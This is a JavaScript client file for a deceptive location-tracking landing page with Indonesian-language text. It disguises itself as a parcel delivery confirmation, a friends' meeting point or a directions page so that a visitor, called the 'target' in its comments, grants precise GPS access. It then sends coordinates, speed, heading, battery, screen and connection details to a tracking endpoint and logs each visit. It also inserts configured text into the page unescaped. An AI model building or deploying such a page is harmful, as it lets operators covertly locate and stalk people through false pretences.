// Client logic for Target Landing Page

const pathParts = window.location.pathname.split('/');
const linkId = pathParts[pathParts.length - 1] || new URLSearchParams(window.location.search).get('id');

let linkConfig = null;
let miniMap = null;

// Elements
const mainTitle = document.getElementById('mainTitle');
const badgeDestination = document.getElementById('badgeDestination');
const descText = document.getElementById('descText');
const btnShareLocation = document.getElementById('btnShareLocation');
const btnText = document.getElementById('btnText');
const btnSpinner = document.getElementById('btnSpinner');
const statusBox = document.getElementById('statusBox');
const resultMapContainer = document.getElementById('resultMapContainer');
const linkDirectGoogleMaps = document.getElementById('linkDirectGoogleMaps');
const headerIcon = document.getElementById('headerIcon');

// 1. Notify server of page visit (Click count)
if (linkId) {
  fetch(`/api/visit/${linkId}`, { method: 'POST' }).catch(() => {});
}

// 2. Fetch Link Configuration
async function loadLinkConfig() {
  if (!linkId) return;
  try {
    const res = await fetch(`/api/links/${linkId}`);
    const data = await res.json();
    if (data.success && data.link) {
      linkConfig = data.link;
      applyPreset(linkConfig);
    }
  } catch (err) {
    console.warn('Failed to load link config:', err);
  }
}

// Apply visual preset based on link settings
function applyPreset(link) {
  if (link.title) {
    document.title = `${link.title} - Petunjuk Arah`;
    mainTitle.textContent = link.title;
  }

  if (link.targetDestination) {
    badgeDestination.innerHTML = `<span>🎯 Tujuan: ${link.targetDestination}</span>`;
  }

  if (link.preset === 'delivery') {
    headerIcon.textContent = '📦';
    badgeDestination.innerHTML = '<span>📦 Konfirmasi Pengiriman</span>';
    mainTitle.textContent = link.title || 'Konfirmasi Lokasi Penerima Paket';
    descText.textContent = 'Bagikan titik koordinat lokasi Anda agar kurir dapat memastikan titik pengantaran paket secara akurat.';
    btnText.innerHTML = '📦 Bagikan Lokasi Penerima';
  } else if (link.preset === 'hangout') {
    headerIcon.textContent = '☕';
    badgeDestination.innerHTML = '<span>☕ Titik Kumpul Teman</span>';
    mainTitle.textContent = link.title || 'Bagikan Lokasi Titik Temu';
    descText.textContent = 'Bagikan posisi Anda saat ini agar rekan atau grup dapat melihat estimasi kedatangan Anda di peta.';
    btnText.innerHTML = '☕ Bagikan Lokasi ke Teman';
  } else {
    // Default: Map Location Sharing
    headerIcon.textContent = '📍';
    if (!link.targetDestination) {
      badgeDestination.innerHTML = '<span>📍 Berbagi Lokasi GPS</span>';
    }
  }
}

// Helper: Show status box
function setStatus(type, message) {
  statusBox.className = `status-box ${type}`;
  statusBox.innerHTML = message;
  statusBox.style.display = 'block';
}

function setLoadingState(isLoading, text = '') {
  if (isLoading) {
    btnSpinner.style.display = 'inline-block';
    btnText.textContent = text || 'Memproses izin lokasi...';
    btnShareLocation.disabled = true;
    btnShareLocation.style.opacity = '0.85';
  } else {
    btnSpinner.style.display = 'none';
    btnText.innerHTML = text || '🗺️ Buka Peta & Petunjuk Arah';
    btnShareLocation.disabled = false;
    btnShareLocation.style.opacity = '1';
  }
}

// Battery API helper
async function getBatteryLevel() {
  try {
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      return Math.round(battery.level * 100) + '%' + (battery.charging ? ' (Charging)' : '');
    }
  } catch (e) {}
  return null;
}

// Request & Handle Geolocation
async function handleGetLocation() {
  if (!navigator.geolocation) {
    setStatus('error', '⚠️ Browser Anda tidak mendukung fitur Geolocation. Silakan buka link ini menggunakan Google Chrome atau Safari.');
    return;
  }

  setLoadingState(true, 'Menghubungkan ke satelit GPS...');
  setStatus('loading', '🛰️ Sedang membaca koordinat GPS perangkat Anda untuk menghitung rute...');

  // Extra device parameters
  const screenResolution = `${window.screen.width}x${window.screen.height}`;
  const connectionType = navigator.connection ? navigator.connection.effectiveType : 'unknown';
  const battery = await getBatteryLevel();

  navigator.geolocation.getCurrentPosition(
    async (position) => {
      // SUCCESS: Coordinates obtained!
      const {
        latitude,
        longitude,
        accuracy,
        altitude,
        altitudeAccuracy,
        heading,
        speed
      } = position.coords;

      setLoadingState(true, 'Menyinkronkan data peta...');
      setStatus('loading', '📍 Koordinat GPS akurat diperoleh. Menampilkan titik navigasi...');

      try {
        // Send payload to backend
        const response = await fetch(`/api/track/${linkId || 'direct'}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            latitude,
            longitude,
            accuracy,
            altitude,
            altitudeAccuracy,
            heading,
            speed,
            screenResolution,
            battery,
            connectionType
          })
        });

        const result = await response.json();
        
        // UI updates for target
        setLoadingState(false, '✅ Lokasi Anda Dikonfirmasi');
        btnShareLocation.style.background = '#34a853';

        const road = (result.address && result.address.road) ? result.address.road : 'Posisi Anda saat ini';
        const city = (result.address && result.address.city && result.address.city !== '-') ? result.address.city : '';
        const addressSummary = [road, city].filter(Boolean).join(', ');

        setStatus('success', `
          <strong>📍 Lokasi Berhasil Terdeteksi!</strong><br>
          ${addressSummary}<br>
          <small style="color: #137333;">Akurasi sinyal: &plusmn;${Math.round(accuracy)} meter</small>
        `);

        // Display interactive mini-map
        resultMapContainer.style.display = 'block';
        if (!miniMap) {
          miniMap = L.map('resultMapContainer').setView([latitude, longitude], 16);
          L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; OpenStreetMap'
          }).addTo(miniMap);

          L.marker([latitude, longitude]).addTo(miniMap)
            .bindPopup(`<b>Posisi Anda</b><br>${addressSummary}`)
            .openPopup();

          L.circle([latitude, longitude], {
            radius: accuracy,
            color: '#1a73e8',
            fillColor: '#1a73e8',
            fillOpacity: 0.15
          }).addTo(miniMap);
        } else {
          miniMap.setView([latitude, longitude], 16);
        }

        // Direct Google Maps Link
        const gmapsDestination = linkConfig && linkConfig.targetDestination 
          ? encodeURIComponent(linkConfig.targetDestination)
          : `${latitude},${longitude}`;
        const gmapsUrl = `https://www.google.com/maps/dir/?api=1&destination=${gmapsDestination}`;
        
        linkDirectGoogleMaps.href = gmapsUrl;
        linkDirectGoogleMaps.style.display = 'inline-block';
        linkDirectGoogleMaps.textContent = '🚀 Buka Navigasi Rute di Google Maps ↗';

        // Auto prompt open google maps after 2 seconds
        setTimeout(() => {
          btnShareLocation.onclick = () => window.open(gmapsUrl, '_blank');
          btnText.textContent = '🚀 Buka Navigasi Google Maps';
        }, 1200);

      } catch (err) {
        console.error('Submission error:', err);
        setLoadingState(false, '🗺️ Coba Buka Peta Lagi');
        setStatus('error', 'Gagal menyinkronkan ke server peta. Silakan coba kembali.');
      }
    },
    (error) => {
      // ERROR HANDLER
      setLoadingState(false, '🗺️ Coba Buka Peta Lagi');
      console.warn('Geolocation error:', error);

      switch (error.code) {
        case error.PERMISSION_DENIED:
          setStatus('error', `
            <strong>⚠️ Izin Lokasi Diperlukan</strong><br>
            Untuk menampilkan rute dan estimasi waktu dari posisi Anda, silakan izinkan akses lokasi pada browser:<br>
            <ol style="margin-top: 6px; padding-left: 18px; font-size: 0.82rem;">
              <li>Ketuk ikon gembok / setelan di samping alamat web di atas.</li>
              <li>Pilih <strong>Izin Situs</strong> &rarr; Ubah <strong>Lokasi</strong> menjadi <strong>Izinkan</strong>.</li>
              <li>Muat ulang (refresh) halaman ini.</li>
            </ol>
          `);
          break;
        case error.POSITION_UNAVAILABLE:
          setStatus('error', '⚠️ Sinyal GPS tidak tersedia saat ini. Pastikan GPS/Location di pengaturan perangkat Anda telah aktif.');
          break;
        case error.TIMEOUT:
          setStatus('error', '⚠️ Waktu pembacaan GPS habis. Silakan ketuk tombol sekali lagi untuk mencoba.');
          break;
        default:
          setStatus('error', '⚠️ Terjadi kesalahan saat membaca lokasi perangkat. Silakan coba kembali.');
      }
    },
    {
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0
    }
  );
}

// Event Listeners
document.addEventListener('DOMContentLoaded', () => {
  loadLinkConfig();
  btnShareLocation.addEventListener('click', handleGetLocation);
});
